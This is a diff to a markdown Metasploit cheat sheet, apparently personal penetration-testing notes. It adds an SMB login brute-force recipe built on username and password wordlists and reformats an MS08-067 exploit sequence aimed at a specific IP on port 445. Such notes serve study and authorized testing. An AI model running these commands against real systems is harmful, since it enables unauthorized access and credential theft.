@@ -1,5 +1,19 @@
 ## msfconsole (msf | metaspolit)
 
+#### General
+
+#### SMB Login
+```bash
+msfconsole
+use auxiliary/scanner/smb/smb_login
+set RHOSTS <ip address>
+set SMBUSER <username>
+set USER_FILE /usr/share/wordlists/custom/usernamelist.txt
+set PASS_FILE /usr/share/wordlists/custom/passwordlist.txt
+set STOP_ON_SUCCESS true
+exploit
+```
+
 #### Search
 
 ##### Search for SMB Exploits on Windows
@@ -13,13 +27,12 @@
 #### Attack
 
 ##### Attack SMB for Windows
-`msf > use exploit/windows/smb/ms08_067_netapi`
-
-`msf exploit(ms08_067_netapi) > set RHOST 10.37.129.9`
-
-`msf exploit(ms08_067_netapi) > set RPORT 445`
-
-`msf exploit(ms08_067_netapi) > exploit`
+```bash
+msf > use exploit/windows/smb/ms08_067_netapi
+msf exploit(ms08_067_netapi) > set RHOST 10.37.129.9
+msf exploit(ms08_067_netapi) > set RPORT 445
+msf exploit(ms08_067_netapi) > exploit
+```
 
 #### meterpreter
 
